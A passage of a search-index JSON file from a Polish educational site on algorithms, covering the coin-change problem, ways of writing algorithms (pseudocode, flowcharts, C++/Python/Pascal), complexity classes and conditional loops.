reszty)","text":"<p>Problem bankomatu, czy te\u017c problem wydawania reszty, to problem, w kt\u00f3rym zadajemy sobie nast\u0119puj\u0105ce pytanie: ile co najmniej monet i/lub banknot\u00f3w potrzeba do wydania zadanej kwoty?</p>"},{"location":"algorithms/integers/atm-problem/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/integers/atm-problem/#dane","title":"Dane","text":"<ul> <li>\\(n\\) \u2014 liczba naturalna, ilo\u015b\u0107 dost\u0119pnych nomina\u0142\u00f3w</li> <li>\\(nomina\u0142y[1..n]\\) \u2014 tablica dost\u0119pnych nomina\u0142\u00f3w (liczb ca\u0142kowitych) o rozmiarze \\(n\\)</li> <li>\\(kwota\\) \u2014 liczba naturalna, kwota do wydania</li> </ul>"},{"location":"algorithms/integers/atm-problem/#wynik","title":"Wynik","text":"<ul> <li>Minimalna liczba potrzebnych monet i/lub banknot\u00f3w do wydania podanej kwoty przy u\u017cyciu dost\u0119pnych nomina\u0142\u00f3w.</li> </ul>"},{"location":"algorithms/integers/atm-problem/#przykad-1","title":"Przyk\u0142ad 1","text":""},{"location":"algorithms/integers/atm-problem/#dane_1","title":"Dane","text":"<pre><code>n := 4\nnomina\u0142y := [1, 2, 5, 10]\nkwota := 28\n</code></pre>"},{"location":"algorithms/integers/atm-problem/#wynik_1","title":"Wynik","text":"<p>Minimalna liczba potrzebnych monet i/lub banknot\u00f3w: \\(5\\).</p> <p>Wykorzystane monety/banknoty: \\(1, 2, 5, 10, 10\\)</p>"},{"location":"algorithms/integers/atm-problem/#przykad-2","title":"Przyk\u0142ad 2","text":""},{"location":"algorithms/integers/atm-problem/#dane_2","title":"Dane","text":"<pre><code>n := 3\nnomina\u0142y := [1, 7, 10]\nkwota := 14\n</code></pre>"},{"location":"algorithms/integers/atm-problem/#wynik_2","title":"Wynik","text":"<p>Minimalna liczba potrzebnych monet i/lub banknot\u00f3w: \\(2\\).</p> <p>Wykorzystane monety/banknoty: \\(7, 7\\)</p>"},{"location":"algorithms/integers/atm-problem/dynamic/","title":"Rozwi\u0105zanie dynamiczne","text":""},{"location":"algorithms/integers/atm-problem/dynamic/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/integers/atm-problem/dynamic/#c","title":"C++","text":""},{"location":"algorithms/integers/atm-problem/dynamic/#python","title":"Python","text":""},{"location":"algorithms/integers/atm-problem/greedy/","title":"Rozwi\u0105zanie zach\u0142anne","text":""},{"location":"algorithms/integers/atm-problem/greedy/#funkcje-pomocnicze","title":"Funkcje pomocnicze","text":"<ul> <li>Sortuj(tablica) - sortuje tablic\u0119 malej\u0105co</li> </ul>"},{"location":"algorithms/integers/atm-problem/greedy/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja Reszta(n, nomina\u0142y, kwota):\n    1. Sortuj(nomina\u0142y)\n    2. wynik := 0\n    3. Od i := 1 do n, wykonuj:\n        4. Dop\u00f3ki kwota &gt;= nomina\u0142y[i], to:\n            5. kwota := kwota - nomina\u0142y[i]\n            6. wynik := wynik + 1\n\n    7. Zwr\u00f3\u0107 wynik\n</code></pre>"},{"location":"algorithms/integers/atm-problem/greedy/#optymalizacja","title":"Optymalizacja","text":"<pre><code>funkcja Reszta(n, nomina\u0142y, kwota):\n    1. Sortuj(nomina\u0142y)\n    2. wynik := 0\n    3. Od i := 1 do n, wykonuj:\n        4. Je\u017celi kwota &gt;= nomina\u0142y[i], to:\n            5. wynik := wynik + kwota div nomina\u0142y[i]\n            6. kwota := kwota mod nomina\u0142y[i]\n\n    7. Zwr\u00f3\u0107 wynik\n</code></pre> <p>Info</p> <p>div oznacza dzielenie ca\u0142kowite</p> <p>mod oznacza reszt\u0119 z dzielenia</p>"},{"location":"algorithms/integers/atm-problem/greedy/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(n)\\) - liniowa (przy zastosowaniu odpowiedniego algorytmu sortowania)</p>"},{"location":"algorithms/integers/atm-problem/greedy/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/integers/atm-problem/greedy/#c","title":"C++","text":""},{"location":"algorithms/integers/atm-problem/greedy/#python","title":"Python","text":""},{"location":"algorithms/introduction/","title":"Wprowadzenie do Algorytm\u00f3w","text":"<p>Algorytmy to zestawy krok\u00f3w lub instrukcji s\u0142u\u017c\u0105cych do wykonania okre\u015blonych zada\u0144 lub rozwi\u0105zywania problem\u00f3w. Mo\u017cna je por\u00f3wna\u0107 do przepis\u00f3w kulinarnych: tak jak przepis krok po kroku prowadzi Ci\u0119 przez proces przygotowywania dania, algorytm prowadzi Ci\u0119 przez proces rozwi\u0105zywania problemu lub wykonania zadania.</p> <p>Algorytmy s\u0105 podstawowym narz\u0119dziem w informatyce. U\u017cywa si\u0119 ich do wszystkiego, od prostych zada\u0144, jak sortowanie listy nazwisk, po bardziej z\u0142o\u017cone, jak analizowanie danych czy nawet prowadzenie samochod\u00f3w autonomicznych. Ich pi\u0119kno polega na tym, \u017ce s\u0105 one jasne, precyzyjne i, co najwa\u017cniejsze, powtarzalne. Oznacza to, \u017ce ka\u017cda osoba (lub maszyna) wykonuj\u0105ca algorytm w taki sam spos\u00f3b, osi\u0105gnie taki sam wynik, dla takich samych danych wej\u015bciowych (wyj\u0105tek oczywi\u015bcie stanowi\u0105 algorytmy niedeterministyczne, zawieraj\u0105ce w sobie losowo\u015b\u0107).</p> <p>W kolejnych cz\u0119\u015bciach b\u0119dziemy eksplorowa\u0107 r\u00f3\u017cne rodzaje algorytm\u00f3w, ich zastosowania, a tak\u017ce to, jak je projektowa\u0107 i analizowa\u0107. Bez wzgl\u0119du na to, czy jeste\u015b pocz\u0105tkuj\u0105cym w dziedzinie informatyki, czy ju\u017c posiadasz pewne do\u015bwiadczenie, zrozumienie algorytm\u00f3w jest kluczowe do rozwoju umiej\u0119tno\u015bci w tej fascynuj\u0105cej dziedzinie.</p> <p>Poni\u017csza prezentacja zawiera kr\u00f3tkie wprowadzenie do \u015bwiata algorytm\u00f3w.</p> <p> Algorytmy - wprowadzenie</p>"},{"location":"algorithms/introduction/#polecane-ksiazki","title":"Polecane ksi\u0105\u017cki","text":"<ul> <li>Maciej M. Sys\u0142o \"Algorytmy\"</li> <li>Maciej M. Sys\u0142o \"Piramidy, szyszki i inne konstrukcje algorytmiczne\"</li> </ul>"},{"location":"algorithms/introduction/#gry","title":"Gry","text":"<p>Do prze\u0107wiczenia my\u015blenia algorytmicznego warto gra\u0107 w r\u00f3\u017cne gry logiczne, takie jak te:</p> <p>Cube composer</p> <p>Robotopia</p> <p>Coding Games for Kids</p>"},{"location":"algorithms/introduction/algorithm-representation/","title":"Sposoby opisu algorytm\u00f3w","text":"<p>Znamy ju\u017c og\u00f3ln\u0105 definicj\u0119 algorytmu. Zanim jednak przejdziemy dalej, om\u00f3wmy r\u00f3\u017cne sposoby zapisu algorytm\u00f3w. Istnieje wiele metod, ale skoncentrujemy si\u0119 na trzech z nich: pseudokodzie, schemacie blokowym i implementacji. Niemniej jednak, warto r\u00f3wnie\u017c pozna\u0107 pozosta\u0142e.</p> <p>Info</p> <p>Algorytm om\u00f3wiony na tej stronie ma charakter czysto ilustracyjny i ma na celu ukazanie r\u00f3\u017cnic pomi\u0119dzy r\u00f3\u017cnymi sposobami zapisu algorytmu. Je\u015bli co\u015b wydaje si\u0119 niejasne, nie przejmuj si\u0119 - wszystko zostanie wyja\u015bnione w kolejnych tematach.</p> <p>Kluczowym elementem ka\u017cdego algorytmu, jak wcze\u015bniej zaznaczyli\u015bmy, jest specyfikacja. Skorzystamy z przyk\u0142adowej specyfikacji, dla kt\u00f3rej poka\u017cemy, jak ten sam algorytm wygl\u0105da w r\u00f3\u017cnych formach zapisu.</p>"},{"location":"algorithms/introduction/algorithm-representation/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/introduction/algorithm-representation/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"algorithms/introduction/algorithm-representation/#wynik","title":"Wynik","text":"<ul> <li>Liczba wszystkich dzielnik\u00f3w \\(n\\)</li> </ul>"},{"location":"algorithms/introduction/algorithm-representation/#opis-sowny","title":"Opis s\u0142owny","text":"<p>Najmniej formalny ze wszystkich przedstawionych tutaj sposob\u00f3w opisu algorytm\u00f3w. Jak nazwa wskazuje, opisujemy algorytm za pomoc\u0105 naszych w\u0142asnych s\u0142\u00f3w, nie trzymaj\u0105c si\u0119 \u017cadnego konkretnego formalizmu. Ze wzgl\u0119du na to, ten typ opisu mo\u017ce by\u0107 pomocny przy burzy m\u00f3zg\u00f3w i wsp\u00f3lnego rozwi\u0105zywania problemu, ale nie b\u0119dzie wystarczaj\u0105cy, je\u017celi chcemy przej\u015b\u0107 do implementacji. Wad\u0105 tego podej\u015bcia mo\u017ce by\u0107 r\u00f3wnie\u017c brak jednoznaczno\u015bci.</p>"},{"location":"algorithms/introduction/algorithm-representation/#przykad","title":"Przyk\u0142ad","text":"<p>Przejd\u017a po kolejnych liczbach od \\(1\\) do \\(n\\) (\\(1,2,3,4,...\\)). W trakcie przechodzenia przez kolejne liczby, zliczaj, przez ile z nich \\(n\\) jest podzielne. To b\u0119dzie wynik algorytmu.</p>"},{"location":"algorithms/introduction/algorithm-representation/#lista-krokow","title":"Lista krok\u00f3w","text":"<p>To bardziej uporz\u0105dkowany spos\u00f3b zapisu w por\u00f3wnaniu do opisu s\u0142ownego, ale wci\u0105\u017c brak mu formalno\u015bci, kt\u00f3ra zazwyczaj jest potrzebna. Mo\u017cemy to postrzega\u0107 jako podzielenie opisu s\u0142ownego na poszczeg\u00f3lne kroki. W zale\u017cno\u015bci od podej\u015bcia, lista krok\u00f3w mo\u017ce by\u0107 bardzo podobna do pseudokodu.</p>"},{"location":"algorithms/introduction/algorithm-representation/#przykad_1","title":"Przyk\u0142ad","text":"<pre><code>1. Zapami\u0119taj wynik r\u00f3wny 0.\n2. Dla kolejnych liczb od 1 do n, wykonuj:\n    3. Je\u017celi n jest podzielne przez sprawdzan\u0105 liczb\u0119, to:\n        4. Zwi\u0119ksz wynik o 1.\n5. Wypisz wynik.\n</code></pre>"},{"location":"algorithms/introduction/algorithm-representation/#pseudokod","title":"Pseudokod","text":"<p>Pseudokod jest czym\u015b pomi\u0119dzy list\u0105 krok\u00f3w a kodem w wybranym j\u0119zyku programowania. Jak nazwa wskazuje, jest to pseudo kod. Mamy wi\u0119c tutaj do czynienia z zapisem bardziej formalnym, ni\u017c lista krok\u00f3w, ale nadal podlegaj\u0105cym pewnym umownym zapisom i regu\u0142om. Brakuje jednak jednego uzgodnionego formalizmu, mo\u017cna wi\u0119c spotka\u0107 si\u0119 z wieloma r\u00f3\u017cnymi podej\u015bciami do zapisu pseudokodu.</p>"},{"location":"algorithms/introduction/algorithm-representation/#przykad_2","title":"Przyk\u0142ad","text":"<pre><code>1. wynik := 0\n2. Od i := 1 do n, wykonuj:\n    3. Je\u017celi n mod i = 0, to:\n        4. wynik := wynik + 1\n5. Wypisz wynik\n</code></pre>"},{"location":"algorithms/introduction/algorithm-representation/#schemat-blokowy","title":"Schemat blokowy","text":"<p>Schemat blokowy to jeden z najbardziej formalnych i jednoznacznych sposob\u00f3w zapisu algorytm\u00f3w. Jak nazwa wskazuje, mamy tutaj do czynienia z blokami, kt\u00f3re \u0142\u0105czymy ze sob\u0105 za pomoc\u0105 strza\u0142ek, oznaczaj\u0105cych kolejno\u015b\u0107 wykonywania operacji. Ka\u017cdy blok ma sw\u00f3j w\u0142asny typ i przeznaczenie, kt\u00f3re s\u0105 zdefiniowane przez jego kszta\u0142t. W podstawowym zapisie wyr\u00f3\u017cniamy nast\u0119puj\u0105ce bloki:</p>"},{"location":"algorithms/introduction/algorithm-representation/#blok-startowy","title":"Blok startowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    K1([START])</code></pre> <p>Od niego wszystko si\u0119 zaczyna. Jego rol\u0105 jest okre\u015blenie pocz\u0105tku programu.</p>"},{"location":"algorithms/introduction/algorithm-representation/#blok-koncowy-terminator","title":"Blok ko\u0144cowy - terminator","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    K1([STOP])</code></pre> <p>Okre\u015bla zako\u0144czenie oblicze\u0144.</p>"},{"location":"algorithms/introduction/algorithm-representation/#blok-wejscia","title":"Blok wej\u015bcia","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    K1[/Cztaj n/]</code></pre> <p>Tutaj wczytujemy dane wej\u015bciowe. Poniewa\u017c blok wej\u015bcia i wyj\u015bcia maj\u0105 taki sam kszta\u0142t, dla czytelno\u015bci dodajemy informacj\u0119 o tym, \u017ce wczytujemy dane, zazwyczaj w formie skr\u00f3tu, np.: wej, czyt, in.</p>"},{"location":"algorithms/introduction/algorithm-representation/#blok-wyjscia","title":"Blok wyj\u015bcia","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    K1[/Wypisz wynik/]</code></pre> <p>Tutaj wypisujemy komunikaty i warto\u015bci, albo te\u017c zwracamy wynik oblicze\u0144. Podobnie jak w przypadku bloku wej\u015bciowego dodajemy skr\u00f3t okre\u015blaj\u0105cy rodzaj operacji, np.: wyj, wyp, out.</p>"},{"location":"algorithms/introduction/algorithm-representation/#blok-obliczen","title":"Blok oblicze\u0144","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    K1[i := i + 1]</code></pre> <p>W tym bloku dokonujemy wszelkich oblicze\u0144, a tak\u017ce inicjalizacji i przypisania warto\u015bci do zmiennych.</p>"},{"location":"algorithms/introduction/algorithm-representation/#blok-instrukcji-warunkowej","title":"Blok instrukcji warunkowej","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    K1{i &lt; n}</code></pre> <p>Jedyny blok, z kt\u00f3rego wychodz\u0105 dwie strza\u0142ki, zazwyczaj na lewo i prawo. Do tych strza\u0142ek dodajemy zazwyczaj napisy typu \"Tak\"/\"Nie\", \"Prawda\"/\"Fa\u0142sz\", albo \"True\"/\"False\" okre\u015blaj\u0105ce, w kt\u00f3rym kierunku obliczenia programu powinny dalej pod\u0105\u017ca\u0107 w zale\u017cno\u015bci od tego, czy warunek jest spe\u0142niony czy te\u017c nie.</p>"},{"location":"algorithms/introduction/algorithm-representation/#przykad_3","title":"Przyk\u0142ad","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"START\"]) --&gt; K0[\"wynik := 0\n    i := 1\"]\n    K0 --&gt; K1{i &lt;= n}\n    K1 -- PRAWDA --&gt; K2{n mod i = 0}\n    K2 -- PRAWDA --&gt; K3[wynik := wynik + 1]\n    K3 --&gt; K1i[i := i + 1]\n    K2 -- FA\u0141SZ --&gt; K1i\n    K1i --&gt; K1\n    K1 -- FA\u0141SZ ---&gt; K5[/Wypisz wynik/]\n    K5 --&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/introduction/algorithm-representation/#kod-w-jezyku-programowania","title":"Kod w j\u0119zyku programowania","text":"<p>Najbardziej formalnym i dok\u0142adnym opisem algorytmu jest jego implementacja w wybranym j\u0119zyku programowania.</p>"},{"location":"algorithms/introduction/algorithm-representation/#przykad_4","title":"Przyk\u0142ad","text":""},{"location":"algorithms/introduction/algorithm-representation/#c","title":"C++","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int n, wynik;\n\n    cin &gt;&gt; n;\n\n    wynik = 0;\n\n    for(int i = 1; i &lt;= n; i++) {\n        if (n % i == 0) {\n            wynik += 1;\n        }\n    }\n\n    cout &lt;&lt; wynik &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre> <p>Przyk\u0142ad - C++</p>"},{"location":"algorithms/introduction/algorithm-representation/#python","title":"Python","text":"<pre><code>n = int(input())\n\nwynik = 0\n\nfor i in range(1, n + 1):\n    if n % i == 0:\n        wynik += 1\n\nprint(wynik)\n</code></pre> <p>Przyk\u0142ad - Python</p>"},{"location":"algorithms/introduction/algorithm-representation/#pascal","title":"Pascal","text":"<pre><code>program dzielniki;\nvar n, wynik, i: integer;\nbegin\n    read(n);\n\n    wynik := 0;\n\n    for i:=1 to n do begin\n        if n mod i = 0 then begin\n            wynik := wynik + 1;\n        end;\n    end;\n\n    writeln(wynik);\nend.\n</code></pre> <p>Przyk\u0142ad - Pascal</p>"},{"location":"algorithms/introduction/complexity/","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>Z\u0142o\u017cono\u015b\u0107 jest bardzo wa\u017cnym elementem dyskusji na temat algorytm\u00f3w. Cz\u0119sto jest to kluczowy czynnik wed\u0142ug kt\u00f3rego por\u00f3wnujemy efektywno\u015b\u0107 dw\u00f3ch rozwi\u0105za\u0144/algorytm\u00f3w. Wyr\u00f3\u017cniamy przede wszystkim:</p> <ul> <li>z\u0142o\u017cono\u015b\u0107 czasow\u0105/obliczeniow\u0105 - tzn. ile operacji w zale\u017cno\u015bci od rozmiaru danych wej\u015bciowych program musi wykona\u0107,</li> <li>z\u0142o\u017cono\u015b\u0107 pami\u0119ciow\u0105 - ile pami\u0119ci (w zale\u017cno\u015bci od rozmiaru danych wej\u015bciowych) program potrzebuje.</li> </ul> <p>W tym kursie nie b\u0119dziemy rozmawia\u0107, ani te\u017c oblicza\u0107 dok\u0142adnej z\u0142o\u017cono\u015bci algorytm\u00f3w. Skupimy si\u0119 na ich szacunkowej pesymistycznej z\u0142o\u017cono\u015bci.</p> <p>Dlatego nie b\u0119dziemy wchodzi\u0107 g\u0142\u0119boko w szczeg\u00f3\u0142y matematyczne. Zainteresowanych odsy\u0142am do zewn\u0119trznych \u017ar\u00f3de\u0142, np.:</p> <ul> <li>https://pl.wikipedia.org/wiki/Z%C5%82o%C5%BCono%C5%9B%C4%87_obliczeniowa</li> <li>https://pl.wikipedia.org/wiki/Asymptotyczne_tempo_wzrostu</li> </ul>"},{"location":"algorithms/introduction/complexity/#notacja-duzego-o-asymptotyczna","title":"Notacja du\u017cego O (asymptotyczna)","text":"<p>Nie b\u0119dziemy tutaj wchodzi\u0107 w szczeg\u00f3\u0142y notacji asymptotycznej du\u017cego O. W du\u017cym skr\u00f3cie b\u0119dziemy jej u\u017cywa\u0107 do okre\u015blania pesymistycznej z\u0142o\u017cono\u015bci czasowej algorytmu. Dla przyk\u0142adu, je\u017celi algorytm b\u0119dzie mia\u0142 z\u0142o\u017cono\u015b\u0107 \\(O(n)\\) to oznacza, \u017ce w najgorszym przypadku b\u0119dzie dzia\u0142a\u0142 liniowo w stosunku do rozmiaru danych. Oczywi\u015bcie nie wyklucza do sytuacji, w kt\u00f3rych taki algorytm zadzia\u0142a szybciej.</p>"},{"location":"algorithms/introduction/complexity/#podstawowe-klasy-zozonosci","title":"Podstawowe klasy z\u0142o\u017cono\u015bci","text":"Zapis Nazwa Przyk\u0142ad \\(O(1)\\) sta\u0142a Sprawdzenie warunku tr\u00f3jk\u0105ta \\(O(\\log{n})\\) logarytmiczna Wyszukiwanie binarne \\(O(n)\\) liniowa Wyszukiwanie liniowe \\(O(n\\log{n})\\) liniowo logarytmiczna Sortowanie przez scalanie \\(O(n^2)\\) kwadratowa Sortowanie b\u0105belkowe \\(O(n^3)\\) sze\u015bcienna Algorytm Floyda-Warshalla \\(O(n^k)\\) wielomianowa ( \\(k\\) - sta\u0142a, \\(k&gt;1\\) ) - \\(O(n!)\\) n-silnia Wypisanie wszystkich permutacji zbioru \\(O(2^n)\\) wyk\u0142adnicza Wypisanie wszystkich podzbior\u00f3w zbioru"},{"location":"algorithms/introduction/complexity/#szacowanie-zozonosci","title":"Szacowanie z\u0142o\u017cono\u015bci","text":""},{"location":"algorithms/introduction/complexity/#przykad-zozonosc-liniowa","title":"Przyk\u0142ad - z\u0142o\u017cono\u015b\u0107 liniowa","text":"<pre><code>1. Od i := 1 do n, wykonuj:\n    2. Wypisz i\n</code></pre>"},{"location":"algorithms/introduction/complexity/#przykad-zozonosc-kwadratowa","title":"Przyk\u0142ad - z\u0142o\u017cono\u015b\u0107 kwadratowa","text":"<pre><code>1. Od i := 1 do n, wykonuj:\n    2. Od j := 1 do n, wykonuj:\n        3. Wypisz i * j\n</code></pre>"},{"location":"algorithms/introduction/complexity/#przykad-zozonosc-szescienna","title":"Przyk\u0142ad - z\u0142o\u017cono\u015b\u0107 sze\u015bcienna","text":"<pre><code>1. Od i := 1 do n, wykonuj:\n    2. Od j := 1 do n, wykonuj:\n        3. Od k := 1 do n, wykonuj:\n            4. Wypisz i * j * k\n</code></pre>"},{"location":"algorithms/introduction/complexity/#przykad-zozonosc-logarytmiczna","title":"Przyk\u0142ad - z\u0142o\u017cono\u015b\u0107 logarytmiczna","text":"<pre><code>1. Dop\u00f3ki n &gt; 0, wykonuj:\n    2. Wypisz n\n    3. n := n div 2\n</code></pre> <p>Info</p> <p>div oznacza dzielenie ca\u0142kowite</p>"},{"location":"algorithms/introduction/complexity/#sciaga","title":"\u015aci\u0105ga","text":"<p>https://github.com/ro31337/bigoposter/blob/master/bigoposter.pdf</p>"},{"location":"algorithms/introduction/conditional-loop/","title":"P\u0119tla warunkowa","text":"<p>Bardzo cz\u0119sto zdarza si\u0119, \u017ce pewne operacje musimy wielokrotnie powt\u00f3rzy\u0107. Sp\u00f3jrzmy na przyk\u0142ad ze \u015bwiat\u0142ami z wprowadzenia do instrukcji warunkowej. W algorytmie okre\u015blili\u015bmy, \u017ce gdy \u015bwiat\u0142o jest czerwone, to mamy sta\u0107 i czeka\u0107. Wszystko \u0142adnie i pi\u0119knie, ale co gdy \u015bwiat\u0142o zmieni si\u0119 na zielone? Czy wtedy powinni\u015bmy ponownie uruchomi\u0107 algorytm? Mo\u017cemy tak w\u0142a\u015bnie post\u0105pi\u0107. Jest jednak te\u017c inne rozwi\u0105zanie. Wiemy, \u017ce na \u015bwiat\u0142ach nale\u017cy czeka\u0107, a\u017c \u015bwiat\u0142o nie zmieni si\u0119 na zielone. Mogliby\u015bmy wi\u0119c powiedzie\u0107: st\u00f3j, dop\u00f3ki \u015bwiat\u0142o jest czerwone. Albo te\u017c: dop\u00f3ki \u015bwiat\u0142o jest czerwone to st\u00f3j. To jest w\u0142a\u015bnie p\u0119tla warunkowa. Kluczowe jest tutaj s\u0142owo dop\u00f3ki, z angielskiego while.</p>"},{"location":"algorithms/introduction/conditional-loop/#petla-prosta","title":"P\u0119tla prosta","text":"<p>Zacznijmy od p\u0119tli prostej - pojedynczej p\u0119tli warunkowej, wewn\u0105trz kt\u00f3rej znajduj\u0105 si\u0119 pewne operacje do powt\u00f3rzenia. W celu lepszego zrozumienia, jak dzia\u0142a p\u0119tla, rozwa\u017cmy pewien przyk\u0142ad.</p>"},{"location":"algorithms/introduction/conditional-loop/#przykad-algorytm-sodzenia-herbaty","title":"Przyk\u0142ad - algorytm s\u0142odzenia herbaty","text":"<p>Rozwa\u017cmy nast\u0119puj\u0105cy problem: przed nami stoi gorzka herbata. Naszym zadaniem jest j\u0105 pos\u0142odzi\u0107 \u0142y\u017ceczk\u0105 cukru, a nast\u0119pnie zamiesza\u0107, \u017ceby cukier si\u0119 rozpu\u015bci\u0142. Zauwa\u017cmy jednak \u017ce nie wiemy z g\u00f3ry jak d\u0142ugo b\u0119dzie trzeba miesza\u0107 herbat\u0119. Mo\u017ce wystarczy zamiesza\u0107 kilka razy, gdy herbata jest gor\u0105ca, a mo\u017ce trzeba b\u0119dzie miesza\u0107 d\u0142u\u017cej. Dlatego pomocna b\u0119dzie tutaj p\u0119tla warunkowa.</p> <p>Zastan\u00f3wmy si\u0119: jaki jest warunek mieszania herbaty? Kiedy musimy herbat\u0119 jeszcze raz zamiesza\u0107? Wtedy, gdy w szklance mamy nierozpuszczony cukier. Spr\u00f3bujmy wi\u0119c skonstruowa\u0107 algorytm s\u0142odzenia herbaty.</p>"},{"location":"algorithms/introduction/conditional-loop/#lista-krokow","title":"Lista krok\u00f3w","text":"<pre><code>1. Wsyp \u0142y\u017ceczk\u0119 cukru do herbaty\n2. Dop\u00f3ki w szklance jest nierozpuszczony cukier, wykonuj:\n    3. Zamieszaj jeden raz\n4. Sprawd\u017a smak herbaty\n</code></pre> <p>Zwr\u00f3\u0107 uwag\u0119 na wci\u0119cie w powy\u017cszym przyk\u0142adzie algorytmu. Tak cz\u0119sto okre\u015blamy, \u017ce instrukcja znajduje si\u0119 wewn\u0105trz p\u0119tli, podobnie jak to by\u0142o z instrukcj\u0105 warunkow\u0105.</p>"},{"location":"algorithms/introduction/conditional-loop/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([START]) --&gt; K1[Wsyp \u0142y\u017ceczk\u0119 cukru do herbaty]\n    K1 --&gt; K2{w szklance jest nierozpuszczony cukier}\n    K2 -- PRAWDA --&gt; K3[Zamieszaj jeden raz]\n    K3 --&gt; K2\n    K2 -- FA\u0141SZ --&gt; K4[Sprawd\u017a smak herbaty]\n    K4 --&gt; STOP([STOP])</code></pre> <p>Przyjrzyj si\u0119 uwa\u017cnie powy\u017cszemu schematowi blokowemu. Zauwa\u017c, \u017ce nie mamy osobnego bloku do p\u0119tli warunkowej. W celu zrealizowania p\u0119tli wykorzystujemy instrukcj\u0119 warunkow\u0105, a nast\u0119pnie prowadzimy odpowiedni\u0105 strza\u0142k\u0119 tu\u017c przed t\u0119 instrukcj\u0119, tym samym zap\u0119tlaj\u0105c nasz schemat.</p>"},{"location":"algorithms/introduction/conditional-loop/#petla-zagniezdzona","title":"P\u0119tla zagnie\u017cd\u017cona","text":"<p>Wiemy ju\u017c jak wygl\u0105da prosta p\u0119tla warunkowa. Czasem jednak jedna p\u0119tla to za ma\u0142o. Czasem musimy zagnie\u017adzi\u0107 wewn\u0105trz siebie dwie (lub wi\u0119cej) p\u0119tli, tym samym uzyskuj\u0105c wielokrotne powt\u00f3rzenia. Zobaczmy jak to wygl\u0105da na przyk\u0142adzie.</p>"},{"location":"algorithms/introduction/conditional-loop/#przykad-wielokrotne-sodzenie-herbaty","title":"Przyk\u0142ad - wielokrotne s\u0142odzenie herbaty","text":"<p>Ponownie rozwa\u017cymy problem s\u0142odzenia herbaty. Zauwa\u017cmy, \u017ce w poprzednim przyk\u0142adzie s\u0142odzili\u015bmy herbat\u0119 jedn\u0105 \u0142y\u017ceczk\u0105 cukru. A co w przypadku, gdy kto\u015b lubi herbat\u0119 s\u0142odzon\u0105 dwiema, trzema, a mo\u017ce nawet czterema \u0142y\u017ceczkami cukru? Potrzebujemy drugiej p\u0119tli, by pos\u0142odzi\u0107 herbat\u0119 wielokrotnie.</p> <p>Jak rozpu\u015bci\u0107 cukier w herbacie ju\u017c wiemy. Pytanie teraz brzmi: jak d\u0142ugo s\u0142odzi\u0107 herbat\u0119? Odpowied\u017a wydaje si\u0119 prosta: dop\u00f3ki herbata nie jest dla nas wystarczaj\u0105co s\u0142odka to b\u0119dziemy j\u0105 s\u0142odzi\u0107. Spr\u00f3bujmy wi\u0119c skonstruowa\u0107 algorytm.</p>"},{"location":"algorithms/introduction/conditional-loop/#lista-krokow_1","title":"Lista krok\u00f3w","text":"<pre><code>1. Dop\u00f3ki herbata nie jest do\u015b\u0107 s\u0142odka, wykonaj:\n    2. Wsyp \u0142y\u017ceczk\u0119 cukru do herbaty\n    3. Dop\u00f3ki w szklance jest nierozpuszczony cukier, wykonuj:\n        4. Zamieszaj jeden raz\n    5. Sprawd\u017a smak herbaty\n</code></pre> <p>Zwr\u00f3\u0107 uwag\u0119 na podw\u00f3jne wci\u0119cie w powy\u017cszym zapisie. Instrukcja 4 Znajduje si\u0119 wewn\u0105trz dw\u00f3ch p\u0119tli. </p>"},{"location":"algorithms/introduction/conditional-loop/#schemat-blokowy_1","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([START]) --&gt; K1{herbata nie jest do\u015b\u0107 s\u0142odka}\n    K1 --&gt; K2[Wsyp \u0142y\u017ceczk\u0119 cukru do herbaty]\n    K2 --&gt; K3{w szklance jest nierozpuszczony cukier}\n    K3 -- PRAWDA --&gt; K4[Zamieszaj jeden raz]\n    K4 --&gt; K3\n    K3 -- FA\u0141SZ --&gt; K5[Sprawd\u017a smak herbaty]\n    K5 --&gt; K1\n    K1 -- FA\u0141SZ ----&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/introduction/conditionals/","title":"Instrukcja warunkowa","text":"<p>Korzystaj\u0105c jedynie z algorytm\u00f3w liniowych nie byliby\u015bmy w stanie rozwi\u0105za\u0107 wielu problem\u00f3w. Dlaczego? Konstrukcja algorytm\u00f3w liniowych jest zbyt... liniowa. Czasem musimy podejmowa\u0107 r\u00f3\u017cne decyzje w zale\u017cno\u015bci od zastanej sytuacji. Wyobra\u017amy sobie problem przechodzenia przez ulic\u0119. Czy potrafisz skonstruowa\u0107 algorytm liniowy bezpiecznego przechodzenia przez przej\u015bcie dla pieszych? Nie mo\u017cemy napisa\u0107 po prostu \"przejd\u017a przez pasy\", poniewa\u017c mo\u017ce jecha\u0107 jaki\u015b samoch\u00f3d! Nale\u017cy najpierw rozejrze\u0107 si\u0119 na boki i dopiero potem, je\u017celi nic nie jedzie, przej\u015b\u0107 na drug\u0105 stron\u0119 